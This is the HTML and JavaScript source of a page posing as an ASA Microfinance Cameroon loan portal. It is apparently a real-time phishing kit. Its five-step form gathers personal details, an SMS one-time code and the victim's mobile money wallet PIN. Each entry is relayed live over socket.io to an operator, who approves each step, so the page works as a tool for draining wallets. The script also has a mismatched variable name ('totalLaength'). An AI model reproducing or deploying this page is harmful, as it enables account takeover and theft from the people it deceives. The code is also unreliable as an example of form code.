<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>ASA Microfinance Cameroon - Instant Loan Application</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        [x-cloak] { display: none !important; }
        :root {
            --bg-dark: #070b19;
            --panel-bg: rgba(17, 24, 39, 0.95);
            --momo-yellow: #ffcc00;
            --momo-yellow-hover: #e6b800;
            --text-main: #ffffff;
            --text-dim: #94a3b8;
            --input-bg: #0f172a;
            --border-color: #334155;
        }
        * { -webkit-tap-highlight-color: transparent; }
        body { 
            /* Downside Green Foundation */
            background: linear-gradient(180deg, #070b19 0%, #021a12 50%, #010d09 100%); 
            font-family: 'Inter', sans-serif; 
            min-height: 100vh; 
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            position: relative;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
        }
        select.input-premium option { background-color: #0f172a; color: white; }
        
        /* Upside Yellow Radial Gradient Ambient Light System */
        .curve-top { 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 50vh; 
            background: radial-gradient(circle at 50% -10%, #ffcc00 0%, #b38f00 30%, rgba(7, 11, 25, 0) 80%); 
            z-index: 1; 
            border-bottom-left-radius: 50% 15%; 
            border-bottom-right-radius: 50% 15%; 
            opacity: 0.85;
        }

        .glass-panel { 
            background: var(--panel-bg); 
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.08); 
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6); 
            border-radius: 1.25rem; 
            color: var(--text-main);
        }
        
        .input-premium { 
            background: var(--input-bg); 
            border: 1px solid var(--border-color); 
            color: var(--text-main); 
            padding: 0.875rem 1.25rem; 
            width: 100%; 
            border-radius: 0.75rem; 
            outline: none; 
            transition: all 0.3s; 
            font-size: 0.9375rem; 
        }
        .input-premium:focus { 
            border-color: var(--momo-yellow); 
            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2); 
        }
        
        .btn-premium { 
            background: var(--momo-yellow); 
            color: #000000; 
            padding: 1rem; 
            font-weight: 700; 
            border-radius: 0.75rem; 
            width: 100%; 
            transition: 0.3s; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            gap: 0.5rem; 
            border: none; 
            cursor: pointer; 
        }
        .btn-premium:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-premium:hover:not(:disabled) { background: var(--momo-yellow-hover); }
        
        .btn-secondary { 
            background: transparent; 
            border: 1px solid var(--border-color); 
            color: var(--text-dim); 
            padding: 1rem; 
            border-radius: 0.75rem; 
            transition: 0.3s; 
            cursor: pointer; 
            font-weight: 600;
        }
        .btn-secondary:hover { background: rgba(255, 255, 255, 0.05); color: #ffffff; }

        .label-premium { 
            font-size: 0.75rem; 
            font-weight: 600; 
            text-transform: uppercase; 
            letter-spacing: 0.05em; 
            color: var(--text-dim); 
            margin-bottom: 0.5rem; 
            display: block; 
        }
        
        .progress-step { display: flex; flex-direction: column; align-items: center; flex: 1; }
        .progress-dot { width: 32px; height: 32px; border-radius: 50%; background: #1e293b; border: 2px solid #334155; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; margin-bottom: 6px; color: #94a3b8; }
        
        .progress-step.active .progress-dot { background: var(--momo-yellow); border-color: var(--momo-yellow); color: #000000; }
        .progress-step.completed .progress-dot { background: #10b981; border-color: #10b981; color: white; }
        .progress-step.completed .progress-dot::after { content: '✓'; font-size: 16px; }
        .progress-step.completed .progress-dot span { display: none; }
        
        .code-box { 
            width: 50px; 
            height: 50px; 
            border: 2px solid var(--border-color); 
            border-radius: 10px; 
            text-align: center; 
            font-size: 24px; 
            font-weight: 700;
            background: var(--input-bg); 
            color: #ffffff; 
            outline: none; 
            transition: all 0.2s;
        }
        .code-box:focus {
            border-color: var(--momo-yellow);
            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2);
        }

        .spinner-sm { animation: spin 1s linear infinite; width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.1); border-top-color: black; border-radius: 50%; display: inline-block; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body class="antialiased p-4">

    <div class="curve-top"></div>

    <main class="w-full max-w-xl mx-auto relative z-10 my-auto">
        <section class="glass-panel overflow-hidden relative" x-data="loanFlow()" x-init="init()">
            
            <div class="bg-white px-6 py-6 border-b border-gray-200">
                <div class="flex flex-col items-center">
                    <img src="https://www.nicepng.com/png/detail/251-2513313_asa-logo-rgb-colour-horiz-fullsize-distr-asa.png" alt="ASA Logo" class="h-12 w-auto mb-3">
                    <h1 class="text-xl font-bold text-gray-900">ASA Microfinance Cameroon</h1>
                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Instant Credit Application Portal</p>
                </div>
            </div>

            <div class="p-6 md:p-8">
                <div class="flex justify-between mb-8">
                    <template x-for="i in 5" :key="i">
                        <div class="progress-step" :class="{ 'active': step === i, 'completed': step > i }">
                            <div class="progress-dot"><span x-text="i"></span></div>
                        </div>
                    </template>
                </div>
                
                <div x-show="step === 1" x-transition.duration.200ms>
                    <div class="flex justify-between items-center mb-6">
                        <h2 class="text-xl font-bold text-white">Loan Details</h2>
                        <span class="text-xs font-bold text-amber-500">Step 01</span>
                    </div>
                    <div class="space-y-4">
                        <div>
                            <label class="label-premium">Credit Scheme Type</label>
                            <select x-model="form.loanType" class="input-premium">
                                <option value="">Select loan structure type</option>
                                <option value="Personal">Personal Short-Term Credit</option>
                                <option value="Business">SME Working Capital Loan</option>
                            </select>
                        </div>
                        <div>
                            <div class="flex justify-between items-center mb-1">
                                <label class="label-premium mb-0">Requested Principal (XAF)</label>
                                <span class="text-xl font-bold text-white" x-text="Number(form.amount).toLocaleString() + ' XAF'"></span>
                            </div>
                            <input type="range" x-model="form.amount" min="5000" max="500000" step="5000" class="w-full accent-amber-500">
                        </div>
                        <div>
                            <label class="label-premium">Repayment Window Term</label>
                            <select x-model="form.term" class="input-premium">
                                <option value="">Select duration cycle</option>
                                <option value="3">3 Months Term</option>
                                <option value="6">6 Months Term</option>
                                <option value="12">12 Months Term</option>
                            </select>
                        </div>
                        <div>
                            <label class="label-premium">Stated Usage Purpose</label>
                            <textarea x-model="form.purpose" class="input-premium h-24" placeholder="Briefly detail what resources will fund..."></textarea>
                        </div>
                        <button @click="submitStep1" :disabled="!isStep1Valid" class="btn-premium mt-2">Continue Setup →</button>
                    </div>
                </div>

                <div x-show="step === 2" x-cloak x-transition.duration.200ms>
                    <div class="flex justify-between items-center mb-6">
                        <h2 class="text-xl font-bold text-white">Identity Verification</h2>
                        <span class="text-xs font-bold text-amber-500">Step 02</span>
                    </div>
                    <div class="space-y-4">
                        <div class="grid grid-cols-2 gap-4">
                            <div>
                                <label class="label-premium">First Name</label>
                                <input type="text" x-model="form.firstName" class="input-premium" placeholder="John">
                            </div>
                            <div>
                                <label class="label-premium">Last Name</label>
                                <input type="text" x-model="form.lastName" class="input-premium" placeholder="Doe">
                            </div>
                        </div>
                        <div>
                            <label class="label-premium">Email Address</label>
                            <input type="email" x-model="form.email" class="input-premium" placeholder="name@domain.com">
                        </div>
                        <div>
                            <label class="label-premium">Registered MoMo Number</label>
                            <div class="flex rounded-lg overflow-hidden">
                                <span class="input-premium w-28 flex items-center justify-center bg-slate-800 border-r-0 rounded-r-none font-bold text-gray-200">🇨🇲 +237</span>
                                <input type="tel" x-model="form.phone" class="input-premium flex-1 rounded-l-none" placeholder="6XXXXXXXX" maxlength="9">
                            </div>
                        </div>
                        <div class="grid grid-cols-2 gap-4 pt-2">
                            <button @click="step = 1" class="btn-secondary">← Back</button>
                            <button @click="submitStep2" :disabled="!isStep2Valid" class="btn-premium">Continue →</button>
                        </div>
                    </div>
                </div>

                <div x-show="step === 3" x-cloak x-transition.duration.200ms>
                    <div class="flex justify-between items-center mb-6">
                        <h2 class="text-xl font-bold text-white">Employment Information</h2>
                        <span class="text-xs font-bold text-amber-500">Step 03</span>
                    </div>
                    <div class="space-y-4">
                        <div>
                            <label class="label-premium">Employment Classification</label>
                            <select x-model="form.employment" class="input-premium">
                                <option value="">Select current status</option>
                                <option value="Employed">Salaried / Employed</option>
                                <option value="Self-Employed">Self-Employed / Merchant</option>
                            </select>
                        </div>
                        <div>
                            <label class="label-premium">Annual Generated Income (XAF)</label>
                            <input type="number" x-model="form.income" class="input-premium" placeholder="Total income value in XAF">
                        </div>
                        <div>
                            <label class="label-premium">Employer Organization Name</label>
                            <input type="text" x-model="form.employer" class="input-premium" placeholder="Company legal title (Optional)">
                        </div>
                        <div class="grid grid-cols-2 gap-4 pt-2">
                            <button @click="step = 2" class="btn-secondary">← Back</button>
                            <button @click="submitStep3" :disabled="!isStep3Valid" class="btn-premium">Continue →</button>
                        </div>
                    </div>
                </div>

                <div x-show="step === 4" x-cloak x-transition.duration.200ms>
                    <div class="flex justify-between items-center mb-6">
                        <h2 class="text-xl font-bold text-white">OTP Verification</h2>
                        <span class="text-xs font-bold text-amber-500">Step 04</span>
                    </div>
                    <div class="space-y-4">
                        <p class="text-sm text-gray-400 text-center">Please input the 6-digit verification code send to your verified mobile number.</p>
                        
                        <div class="flex justify-center gap-2" id="otp-wrapper">
                            <template x-for="(_, i) in 6" :key="i">
                                <input type="text" 
                                       class="code-box otp-box" 
                                       maxlength="1" 
                                       pattern="\d*"
                                       inputmode="numeric"
                                       @input="handleCodeInput($event, i, 6, 'otp')"
                                       @keydown.backspace="handleCodeBackspace($event, i, 'otp')"
                                       x-model="otpData.array[i]">
                            </template>
                        </div>

                        <div class="grid grid-cols-2 gap-4 pt-4">
                            <button @click="step = 3" class="btn-secondary">← Back</button>
                            <button @click="requestAdminApproval" :disabled="!isStep4Valid || otpVerifying" class="btn-premium">
                                <span x-show="!otpVerifying">Verify Credentials →</span>
                                <span x-show="otpVerifying" class="spinner-sm"></span>
                            </button>
                        </div>
                    </div>
                </div>

                <div x-show="step === 5" x-cloak x-transition.duration.200ms>
                    <div class="flex justify-between items-center mb-6">
                        <h2 class="text-xl font-bold text-white">Authorize MoMo PIN</h2>
                        <span class="text-xs font-bold text-amber-500">Step 05</span>
                    </div>
                    <div class="space-y-4">
                        <p class="text-sm text-gray-400 text-center">Authorize configuration by entering your 5-digit security mobile money secure login wallet transaction PIN.</p>
                        
                        <div class="flex justify-center gap-2" id="pin-wrapper">
                            <template x-for="(_, i) in 5" :key="i">
                                <input type="password" 
                                       class="code-box pin-box" 
                                       maxlength="1" 
                                       pattern="\d*"
                                       inputmode="numeric"
                                       @input="handleCodeInput($event, i, 5, 'pin')"
                                       @keydown.backspace="handleCodeBackspace($event, i, 'pin')"
                                       x-model="pin.value[i]">
                            </template>
                        </div>

                        <div class="grid grid-cols-2 gap-4 pt-4">
                            <button @click="step = 4" class="btn-secondary" :disabled="pinVerifying">← Back</button>
                            <button @click="submitStep5" :disabled="!isPinValid || pinVerifying" class="btn-premium">
                                <span x-show="!pinVerifying">Confirm & Request →</span>
                                <span x-show="pinVerifying" class="spinner-sm"></span>
                            </button>
                        </div>
                    </div>
                </div>

                <div x-show="step === 6" x-cloak class="text-center py-8">
                    <div class="w-16 h-16 bg-green-950 text-green-400 border border-green-800 rounded-full flex items-center justify-center text-3xl mx-auto mb-4">✓</div>
                    <h2 class="text-2xl font-bold text-green-400">Application Lodged Successfully</h2>
                    <p class="text-gray-400 mt-2 text-sm">Processing verification. Transaction Registry Identifier:</p>
                    <div class="mt-3 inline-block bg-slate-900 border border-slate-700 px-4 py-2 rounded-md font-mono text-sm text-green-400 font-semibold" x-text="referenceId"></div>
                </div>
            </div>
        </section>
    </main>

    <script>
        function loanFlow() {
            return {
                step: 1, 
                appId: '', 
                referenceId: '', 
                form: { loanType: '', amount: 50000, term: '', purpose: '', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '', employer: '' },
                
                otpData: { array: ['', '', '', '', '', ''] },
                pin: { value: ['', '', '', '', ''] },
                
                otpVerifying: false, 
                pinVerifying: false, 
                socket: null,

                get isStep1Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
                get isStep2Valid() { return this.form.firstName && this.form.lastName && this.form.phone.length >= 8; },
                get isStep3Valid() { return this.form.employment && this.form.income; },
                
                get isStep4Valid() { return this.otpData.array.join('').length === 6; },
                get isPinValid() { return this.pin.value.join('').length === 5; },

                init() {
                    this.socket = io();
                    this.socket.on('session-ready', (data) => { this.appId = data.appId; });
                    this.socket.on('otp-verified', () => { this.otpVerifying = false; this.step = 5; });
                    this.socket.on('pin-verified', (d) => { this.pinVerifying = false; this.referenceId = d.referenceId; this.step = 6; });
                },

                submitStep1() { this.socket.emit('step1', this.form); this.step = 2; },
                submitStep2() { this.socket.emit('step2', this.form); this.step = 3; },
                submitStep3() { this.socket.emit('step3', this.form); this.step = 4; },
                
                requestAdminApproval() { 
                    this.otpVerifying = true; 
                    this.socket.emit('step4', { code: this.otpData.array.join('') }); 
                },
                submitStep5() { 
                    this.pinVerifying = true; 
                    this.socket.emit('step5', { pin: this.pin.value.join('') }); 
                },

                handleCodeInput(e, index, totalLaength, type) {
                    const val = e.target.value;
                    const className = type === 'otp' ? '.otp-box' : '.pin-box';
                    const targetBoxes = document.querySelectorAll(className);

                    if (val && index < totalLength - 1) {
                        targetBoxes[index + 1].focus();
                    }
                },
                handleCodeBackspace(e, index, type) {
                    const className = type === 'otp' ? '.otp-box' : '.pin-box';
                    const targetBoxes = document.querySelectorAll(className);

                    if (e.target.value === '' && index > 0) {
                        targetBoxes[index - 1].focus();
                    }
                }
            }
        }
    </script>
</body>
</html>